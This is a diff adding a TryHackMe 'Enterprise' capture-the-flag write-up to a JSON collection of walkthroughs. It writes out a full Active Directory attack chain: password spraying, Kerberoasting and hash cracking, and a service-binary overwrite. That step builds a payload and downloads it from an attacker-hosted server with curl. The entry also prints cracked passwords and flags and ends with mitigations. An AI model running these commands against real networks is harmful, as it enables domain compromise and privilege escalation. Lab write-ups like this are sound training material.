@@ -2,6 +2,73 @@
  "generated": "2026-11-22",
  "writeups": [
   {
+   "slug": "enterprise",
+   "title": "Enterprise",
+   "platform": "TryHackMe",
+   "difficulty": "Hard",
+   "date": "2026-11-23",
+   "github": "https://github.com/thecyberfarhan/CTF-Writeups/blob/main/TryHackme/enterprise_writeup.md",
+   "summary": "Guest-level SMB access (via a sprayed Password123!) exposes a Docs share, and OSINT on the company's public GitHub leaks a PowerShell script…",
+   "takeaway": "This box is a textbook AD chain: every single step is a small, realistic misconfiguration, and the compromise is the sum of them. The two that transfer most directly to real engagements are checking public source control for the target organisation (secrets leak there constantly) and always enumerating service-binary and service-config permissions on Windows — insecure service permissions are one of the most common and most reliable local privesc vectors.",
+   "tldrHtml": "Guest-level SMB access (via a sprayed <code>Password123!</code>) exposes a <code>Docs</code> share, and OSINT on the company's public GitHub leaks a PowerShell script containing the password <code>ToastyBoi!</code>, which belongs to <code>nik</code>. As <code>nik</code> over WinRM, Kerberoasting the <code>bitbucket</code> service account yields a ticket that cracks to <code>littleredbucket</code>. <code>bitbucket</code> is not allowed to WinRM, so RDP gives an interactive shell and the user flag. For root, the <code>zerotieroneservice</code> runs as LocalSystem from a folder where <code>BUILTIN\\Users</code> has write access, so overwriting the service executable and restarting it runs code as SYSTEM.",
+   "tools": [
+    "RustScan / Nmap",
+    "kerbrute",
+    "NetExec (nxc)",
+    "smbclient",
+    "hashcat",
+    "impacket (GetNPUsers, GetUserSPNs)",
+    "evil-winrm",
+    "xfreerdp",
+    "sc.exe / icacls",
+    "mingw-w64 (x86_64-w64-mingw32-gcc)"
+   ],
+   "sections": [
+    {
+     "id": "introduction",
+     "label": "Introduction",
+     "html": "<p>Enterprise is a hard Windows AD box, and it earns the rating by making you chain five different weaknesses rather than land one big exploit: a weak sprayed password, credentials leaked in public source control, a Kerberoastable service account, a login-rights quirk (WinRM denied but RDP allowed), and finally an insecure-service-permissions privesc. The lesson running through all of it is that AD compromise is usually an accumulation of small trust mistakes, not a single CVE.</p>"
+    },
+    {
+     "id": "recon",
+     "label": "Recon",
+     "html": "<pre><code class=\"language-bash\">rustscan -a 10.49.167.106 --ulimit 5000 -b 500 -t 1500 -- -Pn -sV -sC</code></pre>\n<p>The port list is unmistakably a Domain Controller, with two things that stand out: IIS on 80 and <strong>Atlassian Bitbucket on 7990</strong>.</p>\n<pre><code>53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http\n88/tcp    open  kerberos-sec\n389/tcp   open  ldap          Domain: ENTERPRISE.THM, Site: Default-First-Site-Name\n445/tcp   open  microsoft-ds\n3389/tcp  open  ms-wbt-server\n5985/tcp  open  http          (WinRM)\n7990/tcp  open  http          Atlassian Bitbucket (&quot;Log in with Atlassian account&quot;)\n...\nDNS_Computer_Name: LAB-DC.LAB.ENTERPRISE.THM</code></pre>\n<p>Add the hosts and enumerate. SMB allows a null session, so start with user enumeration over Kerberos:</p>\n<pre><code class=\"language-bash\">echo &quot;10.49.167.106 enterprise.thm lab.enterprise.thm lab-dc.lab.enterprise.thm&quot; | sudo tee -a /etc/hosts\nkerbrute userenum --dc 10.49.167.106 -d LAB.ENTERPRISE.THM /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt</code></pre>\n<pre><code>[+] VALID USERNAME: banana@LAB.ENTERPRISE.THM\n[+] VALID USERNAME: cake@LAB.ENTERPRISE.THM\n[+] VALID USERNAME: enterprise@LAB.ENTERPRISE.THM\n[+] VALID USERNAME: nik@LAB.ENTERPRISE.THM\n[+] VALID USERNAME: spooks@LAB.ENTERPRISE.THM\n[+] VALID USERNAME: joiner@LAB.ENTERPRISE.THM</code></pre>"
+    },
+    {
+     "id": "foothold",
+     "label": "Foothold",
+     "html": "<p>AS-REP roasting is a dead end (<code>nik</code> and the others have pre-auth enabled), so move to a spray of the enumerated users, trying <code>username:username</code> and one common password:</p>\n<pre><code class=\"language-bash\">netexec smb 10.49.167.106 -u users.txt -p 'Password123!' --continue-on-success</code></pre>\n<pre><code>SMB  10.49.167.106  445  LAB-DC  [+] LAB.ENTERPRISE.THM\\enterprise:Password123! (Guest)</code></pre>\n<p>That Guest-level account opens the <code>Docs</code> share:</p>\n<pre><code class=\"language-bash\">smbclient //10.49.167.106/Docs -U &quot;guest&quot;</code></pre>\n<p>It holds <code>RSA-Secured-Credentials.xlsx</code>, a password-protected workbook. Its open-password cracks with hashcat, but the contents are another locked layer (see Rabbit Holes). The path that actually pays off is OSINT: the company name points at a public GitHub org.</p>\n<pre><code>site:github.com &quot;Enterprise-THM&quot;</code></pre>\n<p>That leads to <code>github.com/Enterprise-THM/About-Us</code>, and the commit author <code>Sq00ky</code> has a repo containing a PowerShell script with a hardcoded credential:</p>\n<pre><code class=\"language-powershell\">$userPassword = 'ToastyBoi!'\n$psCreds = ConvertTo-SecureString $userPassword -AsPlainText -Force</code></pre>\n<p>It belongs to <code>nik</code>:</p>\n<pre><code class=\"language-bash\">netexec smb 10.49.167.106 -u 'nik' -p 'ToastyBoi!' -d 'LAB.ENTERPRISE.THM'\n# [+] LAB.ENTERPRISE.THM\\nik:ToastyBoi!</code></pre>"
+    },
+    {
+     "id": "shell",
+     "label": "Shell and access",
+     "html": "<p>NetExec reports WinRM as failing for <code>nik</code>, but that is a false negative — <code>evil-winrm</code> connects fine:</p>\n<pre><code class=\"language-bash\">evil-winrm -i 10.49.167.106 -u 'nik' -p 'ToastyBoi!'\n# *Evil-WinRM* PS C:\\&gt;</code></pre>"
+    },
+    {
+     "id": "escalation",
+     "label": "Escalation",
+     "html": "<p><code>nik</code> is a low-privilege user, so look for Kerberoastable service accounts. With <code>nik</code>'s credentials:</p>\n<pre><code class=\"language-bash\">impacket-GetUserSPNs LAB.ENTERPRISE.THM/nik:'ToastyBoi!' -dc-ip 10.49.167.106 -request</code></pre>\n<pre><code>ServicePrincipalName  Name       MemberOf\nHTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,...\n$krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$...  (ticket)</code></pre>\n<p>Crack the ticket:</p>\n<pre><code class=\"language-bash\">hashcat -m 13100 bitbucket.hash /usr/share/wordlists/rockyou.txt\n# ...:littleredbucket</code></pre>\n<p><code>bitbucket:littleredbucket</code> is valid over SMB, but WinRM refuses it (<code>WinRMAuthorizationError</code> — the account is not in Remote Management Users). RDP is open, though:</p>\n<pre><code class=\"language-bash\">xfreerdp /v:10.49.167.106 /u:'bitbucket@LAB.ENTERPRISE.THM' /p:'littleredbucket' /cert:ignore</code></pre>\n<pre><code>C:\\Users\\bitbucket\\Desktop&gt;type user.txt\nTHM{ed882d02b34246536ef7da79062bef36}</code></pre>"
+    },
+    {
+     "id": "chain",
+     "label": "The full chain",
+     "html": "<p>From the <code>bitbucket</code> RDP session, look at non-default services. <code>zerotieroneservice</code> runs as LocalSystem:</p>\n<pre><code class=\"language-cmd\">sc.exe qc zerotieroneservice</code></pre>\n<pre><code>BINARY_PATH_NAME   : C:\\Program Files (x86)\\Zero Tier\\Zero Tier One\\ZeroTier One.exe\nSERVICE_START_NAME : LocalSystem</code></pre>\n<p>Check the permissions on its program folder:</p>\n<pre><code class=\"language-cmd\">icacls &quot;C:\\Program Files (x86)\\Zero Tier\\Zero Tier One&quot;</code></pre>\n<pre><code>BUILTIN\\Users:(I)(OI)(CI)(W)</code></pre>\n<p><code>BUILTIN\\Users</code> has write on the folder that holds a SYSTEM service's executable — so overwrite the executable and restart the service. Build a small replacement that copies the Administrator's flag somewhere <code>bitbucket</code> can read it:</p>\n<pre><code class=\"language-c\">#include &lt;windows.h&gt;\nint main(void) {\n    system(&quot;cmd.exe /c type C:\\\\Users\\\\Administrator\\\\Desktop\\\\root.txt &gt; C:\\\\Users\\\\bitbucket\\\\Desktop\\\\root.txt&quot;);\n    return 0;\n}</code></pre>\n<p>Compile it <strong>statically</strong> (the dynamically-linked build wouldn't run on the target), host it, and overwrite the real service binary:</p>\n<pre><code class=\"language-bash\">x86_64-w64-mingw32-gcc -static -s /tmp/zero.c -o /tmp/Zero.exe\npython3 -m http.server 8000</code></pre>\n<pre><code class=\"language-cmd\">curl.exe http://192.168.155.76:8000/Zero.exe -o &quot;C:\\Program Files (x86)\\Zero Tier\\Zero Tier One\\ZeroTier One.exe&quot;\nsc.exe stop zerotieroneservice &amp; sc.exe start zerotieroneservice</code></pre>\n<p>The service starts as SYSTEM, runs the payload, and drops the flag where <code>bitbucket</code> can read it:</p>\n<pre><code class=\"language-cmd\">C:\\Users\\bitbucket\\Desktop&gt;type C:\\Users\\bitbucket\\Desktop\\root.txt\nTHM{1a1fa94875421296331f145971ca4881}</code></pre>"
+    },
+    {
+     "id": "rabbit-holes",
+     "label": "Rabbit holes",
+     "html": "<ul><li><strong>AS-REP roasting:</strong> none of the enumerated users had pre-auth disabled, so <code>GetNPUsers</code> returned nothing.</li><li><strong>The <code>.xlsx</code>:</strong> its open-password cracks with <code>hashcat -m 9600</code>, but the workbook just leads to another password prompt. The real credential came from GitHub, not the share.</li><li><strong>WinRM for <code>bitbucket</code>:</strong> the cracked account connects over SMB but gets <code>WinRMAuthorizationError</code> on WinRM. It took switching to RDP to realise the account simply isn't in Remote Management Users — different logon rights, same password.</li><li><strong>The service binary:</strong> the first (dynamically-linked) <code>Zero.exe</code> didn't execute on the target for lack of its runtime DLLs, and it was first uploaded into the wrong folder (<code>...\\Zero Tier\\</code> instead of overwriting <code>...\\Zero Tier One\\ZeroTier One.exe</code>). Static-compiling and overwriting the actual binary fixed both.</li></ul>"
+    },
+    {
+     "id": "mitigations",
+     "label": "Mitigations",
+     "html": "<ul><li><strong>Password spraying / weak passwords:</strong> <code>Password123!</code> should never survive a policy. Enforce length and complexity, and lock or alert on spray patterns.</li><li><strong>Credentials in source control:</strong> the whole foothold is a password committed to a public GitHub repo. Secrets never belong in code; rotate anything that lands there and scan repos with tooling like gitleaks.</li><li><strong>Kerberoasting:</strong> service accounts with SPNs and crackable passwords are the classic AD weakness. Use long random passwords or Group Managed Service Accounts (gMSA), and monitor for bulk TGS requests.</li><li><strong>Insecure service permissions:</strong> <code>BUILTIN\\Users</code> must never have write on a folder that holds a SYSTEM service's executable. Lock the ACL down to Administrators/SYSTEM and audit service paths with a tool like PowerUp.</li></ul>"
+    }
+   ],
+   "takeawayHtml": "This box is a textbook AD chain: every single step is a small, realistic misconfiguration, and the compromise is the sum of them. The two that transfer most directly to real engagements are checking public source control for the target organisation (secrets leak there constantly) and always enumerating service-binary and service-config permissions on Windows — insecure service permissions are one of the most common and most reliable local privesc vectors.",
+   "againHtml": "<p>I'd check the company's GitHub org during the very first recon pass instead of burning time cracking the <code>.xlsx</code>, and I'd test logon rights (<code>net user</code>, group membership) the moment a cracked account fails WinRM, rather than assuming the password was wrong and reaching for RDP by trial and error.</p>"
+  },
+  {
    "slug": "startup",
    "title": "Startup",
    "platform": "TryHackMe",
